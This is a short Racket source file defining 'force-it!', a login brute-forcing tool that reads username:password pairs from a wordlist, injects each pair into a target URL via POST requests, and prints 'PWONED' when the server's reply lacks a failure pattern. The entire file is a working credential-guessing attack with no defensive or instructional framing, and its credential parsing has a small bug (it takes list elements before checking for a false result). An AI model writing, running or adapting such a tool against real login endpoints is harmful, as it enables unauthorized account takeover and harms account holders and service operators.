#lang racket

(require net/url)
(provide force-it!)


;; get-credentials-list : string -> list or false
(define (force-it! url file-location pattern passwd-first? (verbose? #f) (debug? #f))
  (with-input-from-file file-location
    (λ ()
       (let loop ([line (read-line)])
         (when (not (eof-object? line))
           (let* ([credentials (get-credentials-list line passwd-first?)]
                  [first-credential (first credentials)]
                  [second-credential (second credentials)])
             (when credentials
               (when verbose?
                 (displayln (format "trying ~a with cretendials ~a:~a" url first-credential second-credential)))
               (let* ([post-return
                      (post-pure-port
                       (string->url
                        (format url first-credential second-credential))
                       #"")]
                      [string-return (port->string post-return)])
                 (when debug?
                   (displayln (format "Server Response:"))
                   (displayln string-return))
                 (when (not (regexp-match? pattern string-return))
                   (displayln (format "PWONED with ~a:~a" first-credential second-credential))))))
           (loop (read-line)))))))

(define (get-credentials-list line passwd-first?)
  (let ([credentials (regexp-split ":" line)])
    (if passwd-first?
        (if (and (> (length credentials) 1)
                 (> (string-length (second credentials)) 0))
            (list (second credentials) (first credentials))
            #f)
        (list (first credentials) (second credentials)))))



